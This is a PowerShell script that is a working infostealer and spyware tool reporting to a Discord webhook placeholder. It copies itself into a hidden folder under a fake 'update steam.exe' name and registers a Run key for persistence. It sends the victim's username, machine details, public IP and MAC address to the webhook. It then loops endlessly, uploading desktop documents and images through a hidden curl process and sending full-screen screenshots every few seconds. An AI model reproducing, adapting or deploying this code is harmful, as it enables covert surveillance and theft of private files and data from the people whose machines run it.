# Discord Webhook URL
$webhook = "TYPE YOUR WEBHOOK HERE"

# --- Configuration ---
$destinationFolder = "C:\UpdateSteam\"
$clonedExeName = "update steam.exe"
$clonedExePath = Join-Path $destinationFolder $clonedExeName
$tempCloneName = "temp_update_steam.exe"
$tempClonePath = Join-Path $destinationFolder $tempCloneName
$autoStartKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$autoStartValueName = "SystemUpdateTask"
$desktopPath = [Environment]::GetFolderPath("Desktop")
$extensionsToScan = "*.txt", "*.docx", "*.doc", "*.pdf", "*.png", "*.jpg"
$maxFileSizeMB = 8
$logFile = "$env:TEMP\script_log.txt"

# --- Logging Function ---
function Write-LogAndConsole {
    param(
        [string]$Message,
        [string]$Type = "INFO"
    )
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logMessage = "[$timestamp] [$Type] $Message"
    Write-Host $logMessage
    Add-Content -Path $logFile -Value $logMessage -Encoding UTF8
}

Write-LogAndConsole "Script started" "START"

# --- Step 1: Cloning to Folder ---
if (-not (Test-Path -Path $clonedExePath -PathType Leaf)) {
    if (-not (Test-Path -Path $destinationFolder -PathType Container)) {
        try {
            Write-LogAndConsole "Creating folder: $destinationFolder"
            New-Item -Path $destinationFolder -ItemType Directory -Force | Out-Null
        } catch {
            Write-LogAndConsole "Failed to create folder: $($_.Exception.Message). Cloning skipped." "ERROR"
        }
    }
    if (Test-Path -Path $destinationFolder -PathType Container) {
        try {
            $executablePath = ""
            try { $executablePath = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName } catch {}
            if (-not $executablePath) { try { $executablePath = (Get-Process -Id $PID).Path } catch {} }
            if (-not $executablePath) { try { Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue; $executablePath = [System.Windows.Forms.Application]::ExecutablePath } catch {} }
            if (-not $executablePath) { $executablePath = Join-Path (Split-Path -Parent $MyInvocation.MyCommand.Definition) "cheaty.exe" }

            Write-LogAndConsole "Copying executable from: '$executablePath' to: '$tempClonePath'"
            Copy-Item -Path $executablePath -Destination $tempClonePath -Force
            Rename-Item -Path $tempClonePath -NewName $clonedExeName
            Write-LogAndConsole "Executable cloned to: '$clonedExePath'"
        } catch {
            Write-LogAndConsole "Failed to copy executable: $($_.Exception.Message). Cloning skipped." "ERROR"
        }
    }
} else {
    Write-LogAndConsole "File '$clonedExePath' already exists."
}

# --- Step 2: Adding to Autostart ---
if (-not (Get-ItemProperty -Path $autoStartKey -Name $autoStartValueName -ErrorAction SilentlyContinue)) {
    try {
        Write-LogAndConsole "Adding '$clonedExePath' to autostart..."
        Set-ItemProperty -Path $autoStartKey -Name $autoStartValueName -Value $clonedExePath
        Write-LogAndConsole "Added to autostart."
    } catch {
        Write-LogAndConsole "Failed to add to autostart: $($_.Exception.Message). Autostart skipped." "ERROR"
    }
} else {
    Write-LogAndConsole "Autostart entry '$autoStartValueName' already exists."
}

# --- Step 3: Hiding the File ---
if (Test-Path -Path $clonedExePath -PathType Leaf) {
    try {
        $fileInfo = Get-Item -Path $clonedExePath -Force
        if (-not ($fileInfo.Attributes -contains 'Hidden')) {
            Write-LogAndConsole "Hiding file: '$clonedExePath'"
            $fileInfo.Attributes += 'Hidden'
            Write-LogAndConsole "File hidden."
        } else {
            Write-LogAndConsole "File '$clonedExePath' is already hidden."
        }
    } catch {
        Write-LogAndConsole "Failed to check or hide file: $($_.Exception.Message). Hiding skipped." "ERROR"
    }
} else {
    Write-LogAndConsole "File '$clonedExePath' not found, cannot hide." "WARNING"
}

# --- System Information ---
try {
    Write-LogAndConsole "Collecting system information..."
    $user = $env:USERNAME
    $pc = $env:COMPUTERNAME
    $os = (Get-CimInstance Win32_OperatingSystem).Caption
    $osVersion = (Get-CimInstance Win32_OperatingSystem).Version
    $is64 = [System.Environment]::Is64BitOperatingSystem
    $cpu = (Get-CimInstance Win32_Processor | Select-Object -First 1).Name
    $ram = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
    $gpu = (Get-CimInstance Win32_VideoController | Select-Object -First 1).Name
    try {
        $ip = (Invoke-RestMethod -Uri "https://api.ipify.org?format=text" -UseBasicParsing -ErrorAction SilentlyContinue)
        if (-not $ip) { $ip = "Unknown" }
    } catch { $ip = "Failed to get IP"; Write-LogAndConsole "Failed to get IP address: $($_.Exception.Message)" "WARNING" }
    $uptime = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
    $uptime = (Get-Date) - $uptime
    $macAddress = (Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | Select-Object -First 1).MacAddress
    if (-not $macAddress) { $macAddress = "Unknown" }
    Write-LogAndConsole "System information collected."
} catch {
    Write-LogAndConsole "Error collecting system information: $($_.Exception.Message)" "ERROR"
}

try {
    Write-LogAndConsole "Preparing and sending system information..."
    $payload = @{
        embeds = @(
            @{
                title = "System Information"
                color = 3447003
                fields = @(
                    @{ name = "User"; value = "$user"; inline = $true },
                    @{ name = "Computer"; value = "$pc"; inline = $true },
                    @{ name = "OS"; value = "$os"; inline = $false },
                    @{ name = "OS Version"; value = "$osVersion"; inline = $false },
                    @{ name = "CPU"; value = "$cpu"; inline = $false },
                    @{ name = "GPU"; value = "$gpu"; inline = $false },
                    @{ name = "RAM"; value = "$ram GB"; inline = $true },
                    @{ name = "IP"; value = "$ip"; inline = $true },
                    @{ name = "Architecture"; value = if ($is64) { "64-bit" } else { "32-bit" }; inline = $true },
                    @{ name = "Uptime"; value = "$($uptime.Days) days, $($uptime.Hours) hours, $($uptime.Minutes) mins"; inline = $false },
                    @{ name = "MAC Address"; value = "$macAddress"; inline = $true }
                )
                timestamp = [datetime]::UtcNow.ToString("o")
            }
        )
    }
    $payloadJson = $payload | ConvertTo-Json -Depth 5
    Invoke-RestMethod -Uri $webhook -Method Post -Body $payloadJson -ContentType 'application/json' -ErrorAction Stop
    Write-LogAndConsole "System information sent successfully."
} catch {
    Write-LogAndConsole "Error sending system information: $($_.Exception.Message)" "ERROR"
}

# --- Check Screenshot Capabilities ---
$screenshotCapable = $true
try {
    Write-LogAndConsole "Testing screenshot capabilities..."
    Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
    Add-Type -AssemblyName System.Drawing -ErrorAction Stop
    Write-LogAndConsole "Screenshot libraries loaded."
} catch {
    $screenshotCapable = $false
    Write-LogAndConsole "System lacks required libraries for screenshots: $($_.Exception.Message)" "ERROR"
}

# --- Check for curl.exe ---
$curlAvailable = $false
$curlPath = $null
try {
    Write-LogAndConsole "Checking for curl.exe..."
    $curlPath = Get-Command -Name curl.exe -ErrorAction SilentlyContinue
    if ($curlPath) {
        $curlPath = $curlPath.Source
        $curlAvailable = $true
        Write-LogAndConsole "Found curl.exe at: $curlPath"
    } else {
        $possibleCurlLocations = @(
            "C:\Windows\System32\curl.exe",
            "C:\Windows\SysWOW64\curl.exe",
            "$env:ProgramFiles\curl\bin\curl.exe",
            "$env:ProgramFiles(x86)\curl\bin\curl.exe"
        )
        foreach ($location in $possibleCurlLocations) {
            if (Test-Path -Path $location -PathType Leaf) {
                $curlPath = $location
                $curlAvailable = $true
                Write-LogAndConsole "Found curl.exe at: $curlPath"
                break
            }
        }
        if (-not $curlAvailable) {
            Write-LogAndConsole "curl.exe not found in standard locations." "WARNING"
        }
    }
} catch {
    Write-LogAndConsole "Error checking for curl.exe: $($_.Exception.Message)" "ERROR"
}

Write-LogAndConsole "Starting main scan and send loop..."
$sentFiles = @()

while ($true) {
    $fileSent = $false
    Write-LogAndConsole "Scanning desktop files..."
    $filesToProcess = @()
    foreach ($extension in $extensionsToScan) {
        $newFiles = Get-ChildItem -Path $desktopPath -Filter $extension -Recurse |
                      Where-Object { $sentFiles -notcontains $_.FullName }
        $filesToProcess += $newFiles
    }

    if ($filesToProcess.Count -eq 0 -and $sentFiles.Count -gt 0) {
        Write-LogAndConsole "All found files have been sent. Resetting sent files list."
        $sentFiles = @()
        foreach ($extension in $extensionsToScan) {
            $newFiles = Get-ChildItem -Path $desktopPath -Filter $extension -Recurse
            $filesToProcess += $newFiles
        }
    }

    foreach ($file in $filesToProcess) {
        if ($fileSent) { break }
        $fileSizeMB = [math]::Round($file.Length / 1MB, 2)
        if ($fileSizeMB -lt $maxFileSizeMB) {
            Write-LogAndConsole "Found file: $($file.FullName) ($fileSizeMB MB)"
            Write-LogAndConsole "Attempting to send file: $($file.Name)..."
            if ($curlAvailable) {
                try {
                    $curlLogFile = "$env:TEMP\curl_error_$([Guid]::NewGuid()).txt"
                    $arguments = @(
                        "-F", "file=@`"$($file.FullName)`"",
                        $webhook,
                        "--stderr", $curlLogFile
                    )
                    $process = Start-Process -FilePath $curlPath -ArgumentList $arguments -WindowStyle Hidden -Wait -Passthru
                    if ($process.ExitCode -ne 0) {
                        Write-LogAndConsole "curl.exe returned error code: $($process.ExitCode) while sending '$($file.Name)'." "ERROR"
                        if (Test-Path $curlLogFile) {
                            $errorOutput = Get-Content $curlLogFile
                            Write-LogAndConsole "curl.exe - Error file content:" "ERROR"
                            $errorOutput | ForEach-Object { Write-LogAndConsole $_ "ERROR" }
                            Remove-Item $curlLogFile -Force -ErrorAction SilentlyContinue
                        }
                    } else {
                        Write-LogAndConsole "File '$($file.Name)' sent successfully."
                        $fileSent = $true
                        $sentFiles += $file.FullName
                        Remove-Item $curlLogFile -Force -ErrorAction SilentlyContinue
                    }
                } catch {
                    Write-LogAndConsole "Error sending file '$($file.Name)': $($_.Exception.Message)." "ERROR"
                }
            } else {
                Write-LogAndConsole "Cannot send file '$($file.Name)' - curl.exe not found." "ERROR"
            }
            break
        } else {
            Write-LogAndConsole "Skipping file '$($file.Name)' - size ($fileSizeMB MB) exceeds limit ($maxFileSizeMB MB)."
            $sentFiles += $file.FullName
        }
    }

    if ($screenshotCapable) {
        Write-LogAndConsole "Initiating screenshot procedure..."
        try {
            $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
            $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
            $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
            $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
            $tempPath = "$env:TEMP\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').jpg"
            $bitmap.Save($tempPath, [System.Drawing.Imaging.ImageFormat]::Jpeg)
            Write-LogAndConsole "Screenshot saved to: $tempPath"

            if (Test-Path $tempPath) {
                if ($curlAvailable) {
                    Write-LogAndConsole "Sending screenshot via curl.exe: $curlPath"
                    try {
                        $ssLogFile = "$env:TEMP\curl_error_screenshot_$([Guid]::NewGuid()).txt"
                        $ssArguments = @(
                            "-F", "file=@`"$tempPath`"",
                            $webhook,
                            "--stderr", $ssLogFile
                        )
                        $ssProcess = Start-Process -FilePath $curlPath -ArgumentList $ssArguments -WindowStyle Hidden -Wait -Passthru
                        if ($ssProcess.ExitCode -ne 0) {
                            Write-LogAndConsole "curl.exe returned error code: $($ssProcess.ExitCode) while sending screenshot." "ERROR"
                            if (Test-Path $ssLogFile) {
                                $ssErrorOutput = Get-Content $ssLogFile
                                Write-LogAndConsole "curl.exe - Screenshot error file content:" "ERROR"
                                $ssErrorOutput | ForEach-Object { Write-LogAndConsole $_ "ERROR" }
                            }
                        } else {
                            Write-LogAndConsole "Screenshot sent successfully."
                        }
                        if (Test-Path $ssLogFile) { Remove-Item $ssLogFile -Force -ErrorAction SilentlyContinue }
                    } catch {
                        Write-LogAndConsole "Exception during screenshot sending: $($_.Exception.Message)" "ERROR"
                    }
                } else {
                    Write-LogAndConsole "Cannot send screenshot - curl.exe not found" "ERROR"
                }
                try { Remove-Item -Path $tempPath -Force -ErrorAction Stop; Write-LogAndConsole "Temporary screenshot file removed." } catch { Write-LogAndConsole "Failed to remove temporary file: $($_.Exception.Message)" "WARNING" }
            } else {
                Write-LogAndConsole "Screenshot file was not created!" "ERROR"
            }
            if ($graphics) { $graphics.Dispose() }
            if ($bitmap) { $bitmap.Dispose() }
        } catch {
            Write-LogAndConsole "Critical error during screenshot: $($_.Exception.Message)" "ERROR"
        }
    } else {
        Write-LogAndConsole "Skipping screenshot - required libraries not available." "WARNING"
    }

    Write-LogAndConsole "Waiting before next iteration (3 seconds)..."
    Start-Sleep -Seconds 3
}
